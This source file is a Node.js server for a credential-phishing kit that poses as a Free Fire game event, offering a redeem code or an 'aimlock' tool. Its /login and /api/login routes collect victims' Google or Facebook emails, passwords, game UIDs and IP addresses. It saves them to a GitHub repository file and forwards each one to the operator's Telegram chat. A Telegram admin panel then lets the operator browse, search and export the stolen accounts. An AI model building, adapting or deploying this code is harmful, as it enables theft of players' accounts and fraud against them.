const express = require('express');
const path    = require('path');
const fs      = require('fs');
const https   = require('https');

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// ════════════════════════════════════════
//  CONFIG
// ════════════════════════════════════════
const DATA_DIR = path.join(__dirname, 'data');
const CFG_FILE = path.join(DATA_DIR, 'settings.json');

function ensureDir() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
}

// ════════════════════════════════════════
//  SETTINGS — file lokal
// ════════════════════════════════════════
let cfg = {};

function loadSettings() {
  try {
    if (fs.existsSync(CFG_FILE)) cfg = JSON.parse(fs.readFileSync(CFG_FILE, 'utf8'));
  } catch (_) { cfg = {}; }
  return cfg;
}

function saveSettings(obj) {
  ensureDir();
  cfg = obj;
  fs.writeFileSync(CFG_FILE, JSON.stringify(obj, null, 2));
}

loadSettings();
console.log('[Config] Loaded from file');

function getCfg(key, envKey, def = '') {
  return (cfg[key] !== undefined && cfg[key] !== '') ? cfg[key] : (process.env[envKey] || def);
}
const getTgToken = () => getCfg('tgToken', 'TELEGRAM_BOT_TOKEN', '');
const getTgChat  = () => getCfg('tgChat',  'TELEGRAM_CHAT_ID',   '');

// ════════════════════════════════════════
//  DATABASE — GitHub Contents API
//  Repo: Kztutorial99/FreeFireEvent
//  File: data/logins.json
// ════════════════════════════════════════
const GH_TOKEN  = process.env.GITHUB  || '';
const GH_OWNER  = 'Kztutorial99';
const GH_REPO   = 'FreeFireEvent';
const GH_BRANCH = 'main';
const GH_FILE   = 'data/logins.json';

// Memory cache — untuk kurangi GitHub API calls
let _cache      = null;   // array data
let _cacheSha   = null;   // SHA file di GitHub (wajib untuk update)
let _cacheAt    = 0;
const CACHE_TTL = 15000;  // 15 detik

function ghApi(method, endpoint, body) {
  return new Promise((resolve) => {
    const data = body ? JSON.stringify(body) : null;
    const req  = https.request({
      hostname: 'api.github.com',
      path: endpoint,
      method,
      headers: {
        'Authorization': 'Bearer ' + GH_TOKEN,
        'User-Agent':    'ff-bot',
        'Accept':        'application/vnd.github.v3+json',
        'Content-Type':  'application/json',
        ...(data ? { 'Content-Length': Buffer.byteLength(data) } : {})
      }
    }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(d) }); }
        catch { resolve({ status: res.statusCode, body: d }); }
      });
    });
    req.on('error', e => { console.error('[GH]', e.message); resolve({ status: 0, body: null }); });
    if (data) req.write(data);
    req.end();
  });
}

async function ghLoadData() {
  // Pakai cache kalau masih fresh
  if (_cache !== null && Date.now() - _cacheAt < CACHE_TTL) return _cache;
  try {
    const r = await ghApi('GET', `/repos/${GH_OWNER}/${GH_REPO}/contents/${GH_FILE}?ref=${GH_BRANCH}`);
    if (r.status === 200 && r.body && r.body.content) {
      _cacheSha = r.body.sha;
      _cache    = JSON.parse(Buffer.from(r.body.content, 'base64').toString('utf8'));
      _cacheAt  = Date.now();
      return _cache;
    }
    if (r.status === 404) {
      _cache = []; _cacheSha = null; _cacheAt = Date.now();
      return [];
    }
  } catch (e) { console.error('[DB] Load error:', e.message); }
  return _cache || [];
}

async function ghSaveData(arr) {
  if (!GH_TOKEN) { console.warn('[DB] GITHUB token tidak ada'); return false; }
  try {
    const content = Buffer.from(JSON.stringify(arr, null, 2)).toString('base64');
    const body    = {
      message:  `db: update logins (${arr.length} records)`,
      content,
      branch:   GH_BRANCH,
      ...(  _cacheSha ? { sha: _cacheSha } : {})
    };
    const r = await ghApi('PUT', `/repos/${GH_OWNER}/${GH_REPO}/contents/${GH_FILE}`, body);
    if (r.status === 200 || r.status === 201) {
      _cacheSha = r.body.content && r.body.content.sha;
      _cache    = arr;
      _cacheAt  = Date.now();
      return true;
    }
    console.error('[DB] Save failed:', r.status, JSON.stringify(r.body).slice(0, 200));
    return false;
  } catch (e) { console.error('[DB] Save error:', e.message); return false; }
}

async function addLogin(entry) {
  const arr = await ghLoadData();
  arr.unshift(entry);
  if (arr.length > 5000) arr.splice(5000);
  await ghSaveData(arr);
  return arr.length;
}

async function clearDatabase() {
  const arr   = await ghLoadData();
  const count = arr.length;
  await ghSaveData([]);
  return count;
}

async function deleteByIndices(indices) {
  const arr = await ghLoadData();
  indices.sort((a, b) => b - a).forEach(i => arr.splice(i, 1));
  await ghSaveData(arr);
  return arr;
}

async function getDbInfo() {
  const arr  = await ghLoadData();
  const size = (JSON.stringify(arr).length / 1024).toFixed(1) + ' KB';
  return { exists: !!GH_TOKEN, total: arr.length, size, token: !!GH_TOKEN };
}

// ════════════════════════════════════════
//  TELEGRAM API HELPERS
// ════════════════════════════════════════
function tgRequest(method, payload, customToken) {
  return new Promise((resolve) => {
    const token = customToken || getTgToken();
    if (!token) return resolve(null);
    const body = JSON.stringify(payload);
    const req  = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${token}/${method}`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    req.write(body);
    req.end();
  });
}

const tgSend   = (chat, text, extra = {}) =>
  tgRequest('sendMessage', { chat_id: chat, text, parse_mode: 'HTML', ...extra });
const tgEdit   = (chat, msgId, text, extra = {}) =>
  tgRequest('editMessageText', { chat_id: chat, message_id: msgId, text, parse_mode: 'HTML', ...extra });
const tgAnswer = (id, text = '') =>
  tgRequest('answerCallbackQuery', { callback_query_id: id, text });

// ════════════════════════════════════════
//  BOT UI — HELPERS
// ════════════════════════════════════════
const LINE  = '━━━━━━━━━━━━━━━━━━━━━━━';
const LINE2 = '─────────────────────────';

function fmtTime(ts) {
  return new Date(ts).toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta', day: '2-digit', month: '2-digit', year: '2-digit',
    hour: '2-digit', minute: '2-digit', second: '2-digit'
  });
}

function fmtShort(ts) {
  return new Date(ts).toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta', day: '2-digit', month: '2-digit',
    hour: '2-digit', minute: '2-digit'
  });
}

function relativeTime(ts) {
  const diff = Date.now() - ts;
  if (diff < 60000)    return `${Math.floor(diff / 1000)}d lalu`;
  if (diff < 3600000)  return `${Math.floor(diff / 60000)}m lalu`;
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}j lalu`;
  return `${Math.floor(diff / 86400000)}hr lalu`;
}

function methodIcon(m) { return m === 'Google' ? '🔵' : '🔷'; }

// ════════════════════════════════════════
//  BOT MENU & PESAN
// ════════════════════════════════════════

async function buildMainMenu() {
  const logins     = await ghLoadData();
  const total      = logins.length;
  const today      = new Date().toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' });
  const todayCount = logins.filter(l =>
    new Date(l.ts).toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' }) === today
  ).length;
  const lastLogin  = total > 0 ? relativeTime(logins[0].ts) : 'Belum ada';

  const text =
`🎮 <b>FF EVENT — PANEL ADMIN</b>
${LINE}

📊 <b>Total Data</b>    : <code>${total}</code> login
📅 <b>Hari Ini</b>      : <code>${todayCount}</code> login
🕐 <b>Login Terakhir</b> : ${lastLogin}
🗄️ <b>Database</b>     : ✅ GitHub Persistent
🖥️ <b>Status Bot</b>   : ✅ Aktif

${LINE}
<i>Pilih menu di bawah ini 👇</i>`;

  return {
    text,
    keyboard: {
      inline_keyboard: [
        [{ text: '📋 Data Terbaru', callback_data: 'data_0' }, { text: '📈 Statistik', callback_data: 'stats' }],
        [{ text: '🔍 Cari Data', callback_data: 'search_prompt' }, { text: '📤 Export', callback_data: 'export' }],
        [{ text: '🗑️ Hapus Semua', callback_data: 'confirm_clear' }, { text: '🔢 Hapus No', callback_data: 'delete_num_prompt' }],
        [{ text: '🗄️ Database', callback_data: 'database' }, { text: '🔄 Refresh', callback_data: 'menu' }]
      ]
    }
  };
}

const PER_PAGE = 5;
async function buildDataPage(page) {
  const logins = await ghLoadData();
  const total  = logins.length;
  if (total === 0) {
    return {
      text: `📋 <b>DATA LOGIN</b>\n${LINE}\n\n<i>Belum ada data masuk.</i>`,
      keyboard: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
    };
  }

  const totalPages = Math.ceil(total / PER_PAGE);
  page = Math.max(0, Math.min(page, totalPages - 1));
  const start = page * PER_PAGE;
  const slice = logins.slice(start, start + PER_PAGE);

  let text = `📋 <b>DATA LOGIN</b> — Hal ${page + 1}/${totalPages}\n${LINE}\n`;
  text += `<i>Menampilkan ${start + 1}–${Math.min(start + PER_PAGE, total)} dari ${total} data</i>\n`;

  slice.forEach((l, i) => {
    const no        = String(start + i + 1).padStart(3, '0');
    const isAimlock = (l.page === 'aimlock');
    text +=
`\n┌─ <b>#${no}</b> ${pageIcon(l.page)} ${pageLabel(l.page)} • ${methodIcon(l.method)} ${l.method} • ${fmtShort(l.ts)}
├ 📧 <code>${l.email}</code>
├ 🔑 <code>${l.password}</code>
${isAimlock ? '' : `├ 👤 <b>${l.nickname}</b> | 🆔 <code>${l.uid}</code> | 🏆 Lv<b>${l.level || '-'}</b>\n`}└ 🌐 <code>${l.ip}</code>\n`;
  });

  const nav = [];
  if (page > 0)            nav.push({ text: '◀ Sebelumnya', callback_data: `data_${page - 1}` });
  nav.push({ text: `📄 ${page + 1}/${totalPages}`, callback_data: 'noop' });
  if (page < totalPages-1) nav.push({ text: 'Berikutnya ▶', callback_data: `data_${page + 1}` });

  return {
    text,
    keyboard: {
      inline_keyboard: [
        nav,
        [{ text: '⏮ Pertama', callback_data: 'data_0' }, { text: '⏭ Terakhir', callback_data: `data_${totalPages - 1}` }],
        [{ text: '🔄 Refresh', callback_data: `data_${page}` }, { text: '🔙 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
}

async function buildStats() {
  const logins = await ghLoadData();
  const total  = logins.length;
  if (total === 0) {
    return {
      text: `📈 <b>STATISTIK</b>\n${LINE}\n\n<i>Belum ada data.</i>`,
      keyboard: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
    };
  }

  const now         = Date.now();
  const today       = new Date().toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' });
  const todayCount  = logins.filter(l => new Date(l.ts).toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' }) === today).length;
  const weekCount   = logins.filter(l => now - l.ts < 7  * 86400000).length;
  const monthCount  = logins.filter(l => now - l.ts < 30 * 86400000).length;
  const googleCount  = logins.filter(l => l.method === 'Google').length;
  const fbCount      = total - googleCount;
  const gPct         = Math.round(googleCount / total * 100);
  const fPct         = 100 - gPct;
  const aimlockCount = logins.filter(l => l.page === 'aimlock').length;
  const redeemCount  = total - aimlockCount;
  const aPct         = Math.round(aimlockCount / total * 100);
  const rPct         = 100 - aPct;
  const bar          = (pct, len = 12) => '█'.repeat(Math.round(pct / 100 * len)) + '░'.repeat(len - Math.round(pct / 100 * len));

  let text =
`📈 <b>STATISTIK LENGKAP</b>
${LINE}

📊 <b>RINGKASAN DATA</b>
├ Total Semua   : <b>${total}</b> data
├ Hari Ini      : <b>${todayCount}</b> data
├ 7 Hari        : <b>${weekCount}</b> data
└ 30 Hari       : <b>${monthCount}</b> data

📄 <b>SUMBER HALAMAN</b>
├ 🎯 Aimlock   : <b>${aimlockCount}</b> (${aPct}%)
│  <code>${bar(aPct)}</code>
└ 🎁 Redeem    : <b>${redeemCount}</b> (${rPct}%)
   <code>${bar(rPct)}</code>

🔗 <b>METODE LOGIN</b>
├ 🔵 Google    : <b>${googleCount}</b> (${gPct}%)
│  <code>${bar(gPct)}</code>
└ 🔷 Facebook  : <b>${fbCount}</b> (${fPct}%)
   <code>${bar(fPct)}</code>

⏰ <b>WAKTU LOGIN TERAKHIR</b>
└ ${logins[0] ? fmtTime(logins[0].ts) + ' WIB' : '-'}

🏆 <b>5 DATA TERBARU</b>
${LINE2}`;

  logins.slice(0, 5).forEach((l, i) => {
    const isAimlock = (l.page === 'aimlock');
    const label     = isAimlock ? `<code>${l.email}</code>` : `<b>${l.nickname}</b> • <code>${l.uid}</code>`;
    text += `\n${i + 1}. ${pageIcon(l.page)} ${methodIcon(l.method)} ${label} • ${fmtShort(l.ts)}`;
  });

  return {
    text,
    keyboard: {
      inline_keyboard: [
        [{ text: '📋 Lihat Data', callback_data: 'data_0' }, { text: '📤 Export', callback_data: 'export' }],
        [{ text: '🔄 Refresh Statistik', callback_data: 'stats' }],
        [{ text: '🔙 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
}

async function buildExport() {
  const logins = await ghLoadData();
  const total  = logins.length;
  if (total === 0) {
    return {
      text: `📤 <b>EXPORT DATA</b>\n${LINE}\n\n<i>Tidak ada data untuk diekspor.</i>`,
      keyboard: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
    };
  }

  const genTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  let text = `📤 <b>EXPORT DATA — ${total} Login</b>\n🕐 ${genTime} WIB\n${LINE}\n\n`;

  logins.slice(0, 50).forEach((l, i) => {
    text += `<code>#${String(i+1).padStart(3,'0')} | ${l.nickname} | UID:${l.uid} | Lv:${l.level||'-'} | ${l.method} | ${l.email} | ${l.password} | ${l.ip} | ${fmtShort(l.ts)}</code>\n`;
  });

  if (total > 50) text += `\n<i>... dan ${total - 50} data lainnya.</i>`;

  return {
    text,
    keyboard: {
      inline_keyboard: [
        [{ text: '📋 Lihat Detail', callback_data: 'data_0' }, { text: '📈 Statistik', callback_data: 'stats' }],
        [{ text: '🔙 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
}

async function buildDatabase() {
  const info = await getDbInfo();
  const text =
`🗄️ <b>DATABASE INFO</b>
${LINE}

☁️ <b>Storage</b>  : GitHub Repository
📁 <b>File</b>     : <code>data/logins.json</code>
🔑 <b>Token</b>    : ${info.token ? '✅ Terhubung' : '❌ Tidak ada'}
📊 <b>Total Data</b>: <b>${info.total}</b> record
💾 <b>Ukuran</b>   : <b>${info.size}</b>

${LINE}
<i>Data tersimpan permanen di GitHub — tidak hilang saat Vercel restart</i>`;

  return {
    text,
    keyboard: {
      inline_keyboard: [
        [{ text: '🆕 Buat/Reset Database', callback_data: 'db_init' }],
        [{ text: '🗑️ Hapus Semua Data', callback_data: 'confirm_clear' }, { text: '📈 Statistik', callback_data: 'stats' }],
        [{ text: '🔙 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
}

async function buildConfirmClear() {
  const total = (await ghLoadData()).length;
  return {
    text:
`🗑️ <b>HAPUS SEMUA DATA</b>
${LINE}

⚠️ Kamu akan menghapus <b>${total} data login</b>.
❗ Tindakan ini <b>tidak dapat dibatalkan!</b>
Yakin ingin menghapus semua data?`,
    keyboard: {
      inline_keyboard: [
        [{ text: '✅ Ya, Hapus Semua', callback_data: 'do_clear' }, { text: '❌ Batal', callback_data: 'menu' }]
      ]
    }
  };
}

async function buildDeleteNumPrompt() {
  const total = (await ghLoadData()).length;
  return {
    text:
`🔢 <b>HAPUS DATA PER NOMOR</b>
${LINE}

Total data saat ini: <b>${total}</b>

Kirim perintah dengan format:
├ <code>/hapus 5</code>       — hapus nomor 5
├ <code>/hapus 1-50</code>    — hapus nomor 1 sampai 50
└ <code>/hapus 10-100</code>  — hapus nomor 10 sampai 100

<i>Nomor #001 = data terbaru, #${String(total).padStart(3,'0')} = data terlama</i>`,
    keyboard: {
      inline_keyboard: [
        [{ text: '📋 Lihat Data', callback_data: 'data_0' }, { text: '🔙 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
}

function buildInfo() {
  return {
    text:
`ℹ️ <b>INFO BOT</b>
${LINE}

🤖 <b>FF Event Admin Bot</b>
📋 <b>Versi</b>    : 3.0
🎮 <b>Project</b>  : Free Fire Kickoff Event 2026
🗄️ <b>Database</b> : GitHub (Persistent)
☁️ <b>Deploy</b>   : GitHub → Vercel

${LINE}
📡 <b>PERINTAH BOT:</b>
/start    — Menu utama
/data     — Data terbaru
/stats    — Statistik
/export   — Export data
/database — Info & kelola database
/clear    — Hapus semua data
/hapus N  — Hapus nomor N
/hapus X-Y— Hapus range X sampai Y
/cari     — Cari data`,
    keyboard: {
      inline_keyboard: [
        [{ text: '📋 Data', callback_data: 'data_0' }, { text: '📈 Stats', callback_data: 'stats' }],
        [{ text: '🗄️ Database', callback_data: 'database' }],
        [{ text: '🔙 Menu Utama', callback_data: 'menu' }]
      ]
    }
  };
}

function pageIcon(page) {
  return page === 'aimlock' ? '🎯' : '🎁';
}
function pageLabel(page) {
  return page === 'aimlock' ? 'AIMLOCK' : 'REDEEM';
}

function buildNotif(l, no) {
  const isAimlock = (l.page === 'aimlock');
  const header    = isAimlock
    ? '🎯 <b>LOGIN AIMLOCK MASUK!</b>'
    : '🎁 <b>LOGIN REDEEM MASUK!</b>';
  const pageInfo  = isAimlock
    ? '🎯 <b>Halaman</b>   : <b>Aim Lock / Tool FF</b>'
    : '🎁 <b>Halaman</b>   : <b>Code Redeem</b>';

  return `${header}
${LINE}

${pageInfo}
${methodIcon(l.method)} <b>Metode</b>    : <b>${l.method}</b>
📧 <b>Email</b>     : <code>${l.email}</code>
🔑 <b>Password</b>  : <code>${l.password}</code>
${isAimlock ? '' : `👤 <b>Nickname</b>  : <b>${l.nickname}</b>\n🆔 <b>UID</b>       : <code>${l.uid}</code>\n🏆 <b>Level</b>     : <b>${l.level || '-'}</b>\n`}🌐 <b>IP</b>        : <code>${l.ip}</code>
🕐 <b>Waktu</b>     : ${fmtTime(l.ts)} <b>WIB</b>

${LINE}
📊 <b>Data ke-${no}</b> · ${pageIcon(l.page)} ${pageLabel(l.page)}`;
}

// ════════════════════════════════════════
//  WEBHOOK HANDLER
// ════════════════════════════════════════
async function handleUpdate(update) {
  if (update.message) {
    const msg  = update.message;
    const chat = msg.chat.id.toString();
    const text = (msg.text || '').trim();
    const from = msg.from.username || msg.from.first_name || 'Admin';

    if (getTgChat() && chat !== getTgChat()) {
      return tgSend(chat, '⛔ Akses ditolak. Bot ini private.');
    }

    if (text === '/start' || text === '/menu') {
      const { text: t, keyboard } = await buildMainMenu();
      return tgSend(chat, `👋 Halo, <b>${from}</b>!\n\n` + t, { reply_markup: keyboard });
    }
    if (text === '/data') {
      const { text: t, keyboard } = await buildDataPage(0);
      return tgSend(chat, t, { reply_markup: keyboard });
    }
    if (text === '/stats') {
      const { text: t, keyboard } = await buildStats();
      return tgSend(chat, t, { reply_markup: keyboard });
    }
    if (text === '/export') {
      const { text: t, keyboard } = await buildExport();
      return tgSend(chat, t, { reply_markup: keyboard });
    }
    if (text === '/database' || text === '/db') {
      const { text: t, keyboard } = await buildDatabase();
      return tgSend(chat, t, { reply_markup: keyboard });
    }
    if (text === '/clear') {
      const { text: t, keyboard } = await buildConfirmClear();
      return tgSend(chat, t, { reply_markup: keyboard });
    }
    if (text === '/info') {
      const { text: t, keyboard } = buildInfo();
      return tgSend(chat, t, { reply_markup: keyboard });
    }

    // /hapus [no] atau /hapus [x-y]
    if (text.startsWith('/hapus')) {
      const arg    = text.replace('/hapus', '').trim();
      const logins = await ghLoadData();
      if (!arg) {
        const { text: t, keyboard } = await buildDeleteNumPrompt();
        return tgSend(chat, t, { reply_markup: keyboard });
      }
      if (logins.length === 0) {
        return tgSend(chat, `❌ Tidak ada data.`, {
          reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] }
        });
      }
      let indices = [];
      if (arg.includes('-')) {
        const [a, b] = arg.split('-').map(Number);
        if (isNaN(a) || isNaN(b) || a < 1 || b < a) {
          return tgSend(chat, `❌ Format salah! Contoh: <code>/hapus 1-50</code>`, {
            reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] }
          });
        }
        for (let i = a; i <= Math.min(b, logins.length); i++) indices.push(i - 1);
      } else {
        const no = parseInt(arg);
        if (isNaN(no) || no < 1 || no > logins.length) {
          return tgSend(chat, `❌ Nomor tidak valid! (1–${logins.length})`, {
            reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] }
          });
        }
        indices.push(no - 1);
      }
      const remaining = await deleteByIndices(indices);
      return tgSend(chat,
`✅ <b>BERHASIL DIHAPUS!</b>
${LINE}
🗑️ <b>${indices.length}</b> data dihapus
📊 Sisa data: <b>${remaining.length}</b>
🕐 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB`,
        { reply_markup: { inline_keyboard: [[{ text: '📋 Lihat Data', callback_data: 'data_0' }, { text: '🔙 Menu', callback_data: 'menu' }]] } }
      );
    }

    // /cari [keyword]
    if (text.startsWith('/cari')) {
      const q      = text.replace('/cari', '').trim().toLowerCase();
      const logins = await ghLoadData();
      if (!q) {
        return tgSend(chat, `🔍 Format: <code>/cari [kata kunci]</code>`, {
          reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] }
        });
      }
      const found = logins.filter(l =>
        (l.nickname||'').toLowerCase().includes(q) ||
        (l.uid||'').includes(q) ||
        (l.email||'').toLowerCase().includes(q)
      );
      if (found.length === 0) {
        return tgSend(chat, `🔍 <b>"${q}"</b>\n\n❌ Tidak ditemukan.`, {
          reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] }
        });
      }
      let out = `🔍 <b>HASIL: "${q}"</b> — ${found.length} data\n${LINE}\n`;
      found.slice(0, 10).forEach((l, i) => {
        out +=
`\n┌─ <b>#${i+1}</b> ${methodIcon(l.method)} ${fmtShort(l.ts)}
├ 👤 <b>${l.nickname}</b> | 🆔 <code>${l.uid}</code>
├ 📧 <code>${l.email}</code>
├ 🔑 <code>${l.password}</code>
└ 🌐 <code>${l.ip}</code>`;
      });
      if (found.length > 10) out += `\n\n<i>... dan ${found.length - 10} lainnya</i>`;
      return tgSend(chat, out, {
        reply_markup: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
      });
    }

    // Default
    const { text: t, keyboard } = await buildMainMenu();
    return tgSend(chat, t, { reply_markup: keyboard });
  }

  // ── Callback Query ──
  if (update.callback_query) {
    const cb   = update.callback_query;
    const chat = cb.message.chat.id.toString();
    const mid  = cb.message.message_id;
    const data = cb.data;
    await tgAnswer(cb.id);
    if (getTgChat() && chat !== getTgChat()) return;

    if (data === 'menu') {
      const { text, keyboard } = await buildMainMenu();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data.startsWith('data_')) {
      const { text, keyboard } = await buildDataPage(parseInt(data.split('_')[1]) || 0);
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'stats') {
      const { text, keyboard } = await buildStats();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'export') {
      const { text, keyboard } = await buildExport();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'database') {
      const { text, keyboard } = await buildDatabase();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'db_init') {
      const info = await getDbInfo();
      const text =
`🗄️ <b>DATABASE</b>
${LINE}

☁️ Storage: <b>GitHub Repository</b>
📊 Total data: <b>${info.total}</b>
💾 Ukuran: <b>${info.size}</b>
🔑 Token: ${info.token ? '✅ OK' : '❌ Tidak ada'}`;
      return tgEdit(chat, mid, text, {
        reply_markup: { inline_keyboard: [[{ text: '🔙 Database', callback_data: 'database' }, { text: '🏠 Menu', callback_data: 'menu' }]] }
      });
    }
    if (data === 'confirm_clear') {
      const { text, keyboard } = await buildConfirmClear();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'do_clear') {
      const jumlah = await clearDatabase();
      return tgEdit(chat, mid,
`✅ <b>DATA BERHASIL DIHAPUS!</b>
${LINE}
🗑️ <b>${jumlah}</b> data dihapus dari GitHub
🕐 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB`,
        { reply_markup: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] } }
      );
    }
    if (data === 'info') {
      const { text, keyboard } = buildInfo();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'delete_num_prompt') {
      const { text, keyboard } = await buildDeleteNumPrompt();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'search_prompt') {
      return tgEdit(chat, mid,
`🔍 <b>CARI DATA</b>\n${LINE}\n\nKirim: <code>/cari [kata kunci]</code>\n\nContoh:\n<code>/cari PlayerName</code>\n<code>/cari 12345678</code>`,
        { reply_markup: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] } }
      );
    }
    if (data === 'noop') return;
  }
}

// ════════════════════════════════════════
//  SETUP WEBHOOK TELEGRAM
// ════════════════════════════════════════
async function setupWebhook() {
  if (!getTgToken()) return console.log('[Bot] TG_TOKEN tidak ada, webhook dilewati.');
  const domain = process.env.WEBHOOK_URL
    || (process.env.VERCEL_URL      ? `https://${process.env.VERCEL_URL}`      : null)
    || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : null);
  if (!domain) return console.log('[Bot] Domain tidak ditemukan, skip webhook.');
  const webhookUrl = domain.endsWith('/webhook') ? domain : `${domain}/webhook`;
  const res = await tgRequest('setWebhook', {
    url: webhookUrl,
    allowed_updates: ['message', 'callback_query'],
    drop_pending_updates: true
  });
  console.log(res && res.ok ? `[Bot] Webhook aktif: ${webhookUrl}` : `[Bot] Webhook gagal: ${JSON.stringify(res)}`);
}

// ════════════════════════════════════════
//  ROUTES
// ════════════════════════════════════════

app.post('/webhook', async (req, res) => {
  try { await handleUpdate(req.body); } catch (e) { console.error('[Webhook]', e.message); }
  res.sendStatus(200);
});

async function handleLoginCapture(req, res) {
  const body        = req.body || {};
  const emailVal    = body.email || body.username || '';
  const passwordVal = body.password || '';
  if (!emailVal || !passwordVal) {
    return res.status(400).json({ success: false, message: 'Data tidak lengkap' });
  }
  const typeStr = (body.type || '').toLowerCase();
  let methodLabel = 'Facebook';
  if (body.method === 'google' || typeStr.includes('google')) methodLabel = 'Google';
  else if (body.method === 'facebook' || typeStr.includes('facebook')) methodLabel = 'Facebook';
  let pageVal = body.page || 'redeem';
  if (typeStr.includes('aimlock')) pageVal = 'aimlock';

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown')
               .split(',')[0].trim();
  const entry = {
    nickname: body.nickname || 'Player',
    uid:      body.uid      || 'N/A',
    level:    body.level    || '-',
    page:     pageVal,
    method:   methodLabel,
    email:    emailVal,
    password: passwordVal,
    ip,
    ts: Date.now()
  };

  const no = await addLogin(entry);

  if (getTgToken() && getTgChat()) {
    await tgSend(getTgChat(), buildNotif(entry, no), {
      reply_markup: {
        inline_keyboard: [
          [{ text: '📋 Lihat Semua Data', callback_data: 'data_0' }, { text: '📈 Statistik', callback_data: 'stats' }],
          [{ text: '🏠 Menu Utama', callback_data: 'menu' }]
        ]
      }
    });
  }

  res.json({ success: true });
}
app.post('/api/login', handleLoginCapture);
app.post('/login',     handleLoginCapture);

app.get('/api/stats', async (req, res) => {
  const arr    = await ghLoadData();
  const total  = arr.length;
  const google = arr.filter(l => l.method === 'Google').length;
  res.json({ total, google, facebook: total - google, latest: arr[0] || null });
});

app.get('/api/setup-webhook', async (req, res) => {
  await setupWebhook();
  res.json({ ok: true });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ════════════════════════════════════════
//  START
// ════════════════════════════════════════
if (require.main === module) {
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[Server] Berjalan di port ${PORT}`);
    setupWebhook();
  });
} else {
  setupWebhook().catch(e => console.error('[Webhook setup error]', e.message));
}

module.exports = app;
